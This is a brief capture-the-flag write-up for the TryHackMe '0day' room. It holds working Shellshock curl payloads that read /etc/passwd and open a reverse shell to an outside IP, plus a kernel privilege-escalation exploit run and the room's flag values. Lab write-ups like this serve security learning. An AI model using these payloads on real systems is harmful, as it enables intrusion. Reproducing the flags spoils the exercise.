# 0day

> John Hammond |  October 23rd, 2020

------------------------------------

# Potential shellshock?

gobuster logs:

```
/cgi-bin (Status: 301)
/img (Status: 301)
/uploads (Status: 301)
/admin (Status: 301)
/css (Status: 301)
```

# Enumerating cgi-bin:

gobuster logs in cgi-bin

```
test.cgi

http://10.10.78.385/cgi-bin/test.cgi
```

# Code execution

```
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://10.10.78.38/cgi-bin/test.cgi
```

# Reverse shell

```
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'bash -i >& /dev/tcp/10.2.2.132/8888 0>&1'" http://10.10.78.38/cgi-bin/test.cgi
```


## Privesc - kernel version

```
Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
```

```
searchsploit 3.13.0
searchsploit -m linux/local/37292.c

# upload onto victim
```

gcc fails because it find cc1, so, find cc1

```

find / 2>/dev/null | grep cc1

export PATH="$PATH:/usr/lib/gcc/x86_64-linux-gnu/4.8/"
```

```
gcc 37292.c

./a.out # get root!
```

```
# cat root.txt
THM{g00d_j0b_0day_is_Pleased}
#
# cd /home/ryan
# cat user.txt
THM{Sh3llSh0ck_r0ckz}
```